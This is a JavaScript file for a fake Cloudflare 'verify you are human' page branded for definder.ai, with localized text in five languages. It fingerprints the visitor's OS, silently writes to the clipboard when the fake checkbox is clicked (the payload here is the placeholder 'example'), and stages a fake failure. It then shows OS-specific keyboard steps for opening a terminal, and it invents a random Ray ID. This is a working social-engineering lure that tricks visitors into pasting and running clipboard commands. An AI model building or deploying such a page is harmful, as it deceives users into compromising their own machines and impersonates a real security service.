const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');

let osName = "unknown";

const platform = navigator.platform.toLowerCase();
const userAgent = navigator.userAgent.toLowerCase();

if (platform.includes('win')) {
  osName = "windows";

  if (userAgent.includes('windows nt 10.0')) osName = "windows 10";
  else if (userAgent.includes('windows nt 6.3')) osName = "windows 8.1";
  else if (userAgent.includes('windows nt 6.2')) osName = "windows 8";
  else if (userAgent.includes('windows nt 6.1')) osName = "windows 7";
  else if (userAgent.includes('windows nt 6.0')) osName = "windows vista";
  else if (userAgent.includes('windows nt 5.1') || userAgent.includes('windows xp')) osName = "windows xp";

} else if (platform.includes('mac')) {
  osName = "macos";
}

const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (isMobile) {
  const mobileScreen = document.getElementById('mobile-screen');
  if (mobileScreen) mobileScreen.style.display = 'block';

  const mainSection = document.querySelector('section.main');
  if (mainSection) mainSection.style.display = 'none';

  const footer = document.querySelector('footer.footer');
  if (footer) footer.style.display = 'none';
} else {
  const mobileScreen = document.getElementById('mobile-screen');
  if (mobileScreen) mobileScreen.style.display = 'none';

  const mainSection = document.querySelector('section.main');
  if (mainSection) mainSection.style.display = '';

  const footer = document.querySelector('footer.footer');
  if (footer) footer.style.display = '';
}

console.log("Detected OS:", osName);
console.log("Is mobile device:", isMobile);

const translations = {
  en: {
    title: "Just a moment...",
    action: "Verify you are human by completing the action below.",
    verifyText: "Verify you are human",
    verifyingText: "Verify you are human. This may take a few seconds.",
    checkFailed: "Initial check failed. Please complete the action below to verify you’re human.",
    pendingVerification: "Pending verification...",
    description: "definder.ai needs to review the security of your connection before proceeding.",
    footer: 'Performance & security by <a href="">Cloudflare</a>',
    privacy: "Privacy",
    terms: "Terms",
    followStepsWindows: "Follow these steps on your keyboard:",
  },
  es: {
    title: "Un momento…",
    action: "Verifique que usted es un ser humano completando la acción a continuación.",
    verifyText: "Verifica que eres un <br> ser humano",
    verifyingText: "Verificar que usted es un ser humano. Esto podría tardar algunos segundos.",
    checkFailed: "No pasó la verificación inicial. Complete la acción a continuación para confirmar que es humano.",
    pendingVerification: "Verificación pendiente…",
    description: "definder.ai necesita revisar la seguridad de su conexión antes de continuar.",
    footer: 'Rendimiento y seguridad de <a href="">Cloudflare</a>',
    privacy: "Privacidad",
    terms: "Términos",
    followStepsWindows: "Siga estos pasos en su teclado:",
  },
  pt: {
    title: "Um momento…",
    action: "Confirme que você é humano realizando a ação abaixo.",
    verifyText: "Confirme que é <br> humano",
    verifyingText: "Verificando se você é humano. Isso pode levar alguns segundos.",
    checkFailed: "A verificação inicial falhou. Conclua a ação abaixo para confirmar que você é humano.",
    pendingVerification: "Verificação pendente…",
    description: "definder.ai precisa revisar a segurança da sua conexão antes de prosseguir.",
    footer: 'Para obter assistência, acesse a Central de ajuda da <a href="">Cloudflare</a>',
    privacy: "Privacidade",
    terms: "Termos",
    followStepsWindows: "Siga estas etapas no seu teclado:",
  },
  fr: {
    title: "Un instant...",
    action: "Confirmez que vous êtes un humain en effectuant l’action ci-dessous.",
    verifyText: 'Verifiez que vous <br> etes humain',
    verifyingText: "Nous vérifions que vous êtes humain. Cette opération peut prendre quelques secondes.",
    checkFailed: "La vérification initiale a échoué. Veuillez effectuer l’action ci-dessous pour confirmer que vous êtes humain.",
    pendingVerification: "Vérification en attente…",
    description: "definder.ai doit vérifier la sécurité de votre connexion avant de continuer.",
    footer: 'Performance et sécurité par <a href="">Cloudflare</a>',
    privacy: "Confidentialité",
    terms: "Conditions",
    followStepsWindows: "Suivez ces étapes sur votre clavier:",
  },
  zh: {
    title: "请稍候...",
    action: "請完成以下操作，驗證您是人類。",
    verifyText: "Verify you are human",
    verifyingText: "正在驗證您是否是人類。這可能需要幾秒鐘的時間。",
    checkFailed: "初步验证失败。请完成以下操作以确认您是人类。",
    pendingVerification: "正在验证…",
    description: "继续之前，definder.ai 需要先检查您的连接的安全性。",
    footer: 'Performance & security by <a href="">Cloudflare</a>',
    privacy: "Privacy",
    terms: "Terms",
    followStepsWindows: "请按照键盘上的以下步骤操作：",
  }
};

const localizedWords = {
  press: {
    en: 'Press',
    es: 'Presione',
    pt: 'Pressione',
    fr: 'Appuyez sur',
    zh: '按下'
  },
  findOpen: {
    en: 'Find & Open',
    es: 'Busque y abra',
    pt: 'Encontre e abra o',
    fr: 'Trouvez et ouvrez le',
    zh: '查找并打开终端'
  },
  privacy: {
    en: 'Privacy',
    es: 'Privacidad',
    pt: 'Privacidade',
    fr: 'Confidentialite',
    zh: 'Privacy'
  },
  terms: {
    en: 'Terms',
    es: 'Términos',
    pt: 'Termos',
    fr: 'Conditions',
    zh: 'Terms'
  }
};

let lang = navigator.language.slice(0, 2).toLowerCase();
if (!translations.hasOwnProperty(lang)) lang = "en";

document.title = translations[lang].title;

const mainAction = document.getElementById("mainAction");
if (mainAction) mainAction.textContent = translations[lang].verifyingText;

const updateLocalizedSteps = () => {
  const langCode = translations.hasOwnProperty(lang) ? lang : 'en';

  document.querySelectorAll('.pressMacOs').forEach(el => {
    el.textContent = localizedWords.press[langCode];
  });

  document.querySelectorAll('.findOpen').forEach(el => {
    el.textContent = localizedWords.findOpen[langCode];
  });
};

updateLocalizedSteps();

window.addEventListener('DOMContentLoaded', () => {
  const mainDescription = document.getElementById("mainDescription");
  const footerInfo = document.getElementById("footerInfo");
  const followStepsElemWindows = document.querySelector("#followStepsWindows");
  const followStepsElemMacOS = document.querySelector("#followStepsMacOS");
  const followStepsBtn = document.querySelector('.user-steps__text');

  footerInfo.innerHTML = translations[lang].footer;
  mainDescription.textContent = translations[lang].description;
  followStepsElemWindows.textContent = translations[lang].followStepsWindows;
  followStepsElemMacOS.textContent = translations[lang].followStepsWindows;
  followStepsBtn.innerHTML = translations[lang].pendingVerification;

  const privacyLink = document.getElementById("privacy-link");
  const termsLink = document.getElementById("terms-link");
  if (privacyLink) privacyLink.textContent = translations[lang].privacy;
  if (termsLink) termsLink.textContent = translations[lang].terms;

  const loadingCircle = document.getElementById('main__loading-circle');
  const verifyBlock = document.querySelector('.verify');
  const verifyingCircle = document.getElementById('verifying-i');
  const verifyCube = document.querySelector('.verify__i');
  const verifyLabel = document.querySelector('.verify__lb');
  const verifyingCheck = document.getElementById('verifying-i-checking');
  const verifyText = document.getElementById('verify-text');

  document.querySelectorAll('.localized-privacy').forEach(el => {
    el.innerHTML = localizedWords.privacy[lang];
  });
  document.querySelectorAll('.localized-terms').forEach(el => {
    el.innerHTML = localizedWords.terms[lang];
  });

  let interactionEnabled = false;

  const randomDelay = Math.floor(Math.random() * 1000) + 1000;

  setTimeout(() => {
    loadingCircle.style.display = 'none';

    setTimeout(() => {
      verifyBlock.style.display = 'flex';

      const hideCircleDelay = Math.floor(Math.random() * 500) + 1000;

      setTimeout(() => {
        verifyingCircle.style.display = 'none';
        verifyCube.classList.add('visible');

        verifyText.innerHTML = translations[lang].verifyText;
        mainAction.textContent = translations[lang].action;

        interactionEnabled = true;

      }, hideCircleDelay);
    }, 500);
  }, randomDelay);

  verifyLabel.addEventListener('click', () => {
    if (!interactionEnabled) return;
    interactionEnabled = false;

    navigator.clipboard.writeText("example").catch(err => {
      console.error("Clipboard write failed: ", err);
    });

    verifyText.innerHTML = "Verifying...";
    mainAction.textContent = translations[lang].verifyingText;

    const currentTheme = document.documentElement.getAttribute('data-theme');
    verifyCube.style.backgroundColor = currentTheme === 'dark' ? '#6D6D6D' : '#E2E2E2';
    verifyingCheck.style.display = 'flex';

    setTimeout(() => {
      verifyCube.classList.remove('visible');
      verifyCube.style.display = 'none';
      verifyingCircle.style.display = 'block';

      const removeVerifyDelay = Math.floor(Math.random() * 200) + 800;

      setTimeout(() => {
        verifyBlock.style.display = 'none';

        setTimeout(() => {
          loadingCircle.style.display = 'block';

          const failDelay = Math.floor(Math.random() * 1000) + 2000;
          setTimeout(() => {
            loadingCircle.style.display = 'none';
            mainAction.textContent = translations[lang].checkFailed;

            if (osName.startsWith('windows')) {
              const winSteps = document.getElementById('userStepsWindows');
              if (winSteps) winSteps.style.display = 'block';
            } else if (osName === 'macos') {
              const macSteps = document.getElementById('userStepsMacOS');
              if (macSteps) macSteps.style.display = 'block';
            }
          }, failDelay);
        }, 150);
      }, removeVerifyDelay);

    }, 400);
  });
});

function generateRayID() {
  const hex = () => Math.floor(Math.random() * 0x100000000).toString(16).padStart(8, "0");
  return `${hex()}${hex().slice(0, 4)}`;
}

const rayId = generateRayID();
document.getElementById("ray-id").textContent = rayId;